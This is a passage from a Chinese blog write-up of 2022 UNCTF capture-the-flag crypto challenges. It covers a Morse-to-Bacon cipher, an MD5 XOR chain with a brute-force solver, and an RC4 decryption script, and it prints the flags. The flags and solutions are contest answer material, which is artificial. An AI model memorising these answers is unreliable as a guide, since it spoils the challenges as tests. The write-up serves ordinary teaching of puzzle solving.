class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>

<p>转摩斯</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-\-\-\.\-\.\-\-\-\-\.\-\.\.\-\-\.\.\.\-\.\-\-\-\-\-\.\.\-\.\-\.\-\-\-\.\-\-\-\.\-\-\.\-\.\.\-\-\.\.\-\.\.\-\-</span><br></code></pre></td></tr></table></figure>

<p>解码：</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744926.png" srcset="/img/loading.gif" lazyload alt="image-20221117200358369"></p>
<p>得到TTTETETTTTETEETTEEETETTTTTEETETETTTETTTETTETEETTEETEETT</p>
<p>根据题目名称想到培根密码转为</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">AAABABAAAABABBAABBBABAAAAABBABABAAABAAABAABABBAABBABBAA</span><br></code></pre></td></tr></table></figure>

<p>解密培根(有的网站解出来错的，我用的是<a target="_blank" rel="noopener" href="http://www.metools.info/code/bacon193.html">这个</a>)</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744927.png" srcset="/img/loading.gif" lazyload alt="image-20221117200517107"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;CRYPROISFUN&#125;</span><br></code></pre></td></tr></table></figure>



<h2 id="md5-2-西南科技大学"><a href="#md5-2-西南科技大学" class="headerlink" title="md5-2-西南科技大学"></a>md5-2-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744928.png" srcset="/img/loading.gif" lazyload alt="image-20221119104717534"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>flag=<span class="hljs-string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="hljs-string">&#x27;x&#x27;</span>.encode()).hexdigest()<br><span class="hljs-comment"># x不是一个字符是n个字符</span><br><br>md5_=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    md5_.append(<span class="hljs-built_in">int</span>(md5(i.encode()).hexdigest(),<span class="hljs-number">16</span>)) <span class="hljs-comment">#十六转十进制</span><br><span class="hljs-built_in">print</span>(md5_)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(md5_)):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>            file.write(<span class="hljs-built_in">hex</span>(md5_[i])[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>         <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>            file.write(<span class="hljs-built_in">hex</span>(md5_[i]^md5_[i-<span class="hljs-number">1</span>])[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;\n&#x27;</span>)   <br></code></pre></td></tr></table></figure>

<p>整个过程就是md5加密后十六进制转十进制，当前位异或前一位，再转十六进制回去</p>
<p>难度不高，就是中间有点地方编程出了问题，出的有点晚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>t = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>char = <span class="hljs-string">&quot;&quot;</span><br>md5_ = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file.readlines(): <span class="hljs-comment">#a = int(md5(&#x27;N&#x27;.encode()).hexdigest(),16)# </span><br>	<span class="hljs-comment">#bef = line.strip()</span><br>		<span class="hljs-built_in">print</span>(i.strip())<br>		t += <span class="hljs-number">1</span><br>		<span class="hljs-keyword">if</span> t == <span class="hljs-number">1</span>:<br>			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>				c = <span class="hljs-built_in">int</span>(md5(<span class="hljs-built_in">chr</span>(j).encode()).hexdigest(), <span class="hljs-number">16</span>)<br>				<span class="hljs-keyword">if</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>: ] == i.strip():<br>					flag += <span class="hljs-built_in">chr</span>(j)<br>					char = c<br>					<span class="hljs-keyword">break</span><br>		<span class="hljs-keyword">else</span> :<br>			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>				c = <span class="hljs-built_in">int</span>(md5(<span class="hljs-built_in">chr</span>(j).encode()).hexdigest(), <span class="hljs-number">16</span>)<br>				<span class="hljs-keyword">if</span> <span class="hljs-built_in">hex</span>(c ^ char)[<span class="hljs-number">2</span>: ] == i.strip():<br>					flag += <span class="hljs-built_in">chr</span>(j)<br>					char = c<br>					<span class="hljs-keyword">break</span><br>		<span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>

<h2 id="EZcry-广东海洋大学"><a href="#EZcry-广东海洋大学" class="headerlink" title="EZcry-广东海洋大学"></a>EZcry-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744929.png" srcset="/img/loading.gif" lazyload alt="image-20221119104732055"></p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">enc</span> -&gt;</span><span class="hljs-number">28215806134317522883596419220825657511411006710664649462842055320370860932420278362078094716</span><br><span class="hljs-function"><span class="hljs-title">key</span> -&gt;</span> <span class="hljs-number">3544952156018063160</span><br></code></pre></td></tr></table></figure>

<p>题目给了提示，流密码</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744930.png" srcset="/img/loading.gif" lazyload alt="image-20221118195812950"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4de</span>(<span class="hljs-params">data, key1</span>):        <span class="hljs-comment"># 解密</span><br>    <span class="hljs-comment"># data = base64.b64decode(data)</span><br>    enc = ARC4.new(key)<br>    res = enc.decrypt(data)<br>    res = <span class="hljs-built_in">str</span>(res,<span class="hljs-string">&#x27;gbk&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    encrypt_data = libnum.n2s(<span class="hljs-number">28215806134317522883596419220825657511411006710664649462842055320370860932420278362078094716</span>)   <span class="hljs-comment"># 需要加密的内容</span><br>    key = libnum.n2s(<span class="hljs-number">3544952156018063160</span>)  <span class="hljs-comment"># 加密key</span><br>    <span class="hljs-built_in">print</span>(rc4de(encrypt_data, key))      <span class="hljs-comment"># 解密</span><br></code></pre></td></tr></table></figure>

<h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>感谢主办方，感谢出题的各位师傅。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/writeup/" class="category-chain-item">writeup</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/web/">#web</a>
      
        <a href="/tags/2022/">#2022</a>
      
        <a href="/tags/UNCTF/">#UNCTF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2022_UNCTF</div>
      <div>https://emoment.top/2023/01/10/2022-UNCTF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Aru3h@rk</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年1月10日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2023年1月10日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/01/10/2022-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="2022_极客大挑战">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2022_极客大挑战</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/01/10/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89&amp;catf1ag%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E5%85%AC%E5%BC%80%E8%B5%9B/" title="2022_天权信安&amp;catf1ag网络安全联合公开赛">
                        <span class="hidden-mobile">2022_天权信安&amp;catf1ag网络安全联合公开赛</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">载入网站运行时间...</span> <script src="/js/duration.js"></script> </div>  
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/diy/qipao.js"></script>
<script src="/js/diy/timeDate.js"></script>
<script src="/js/diy/shubiaozi.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
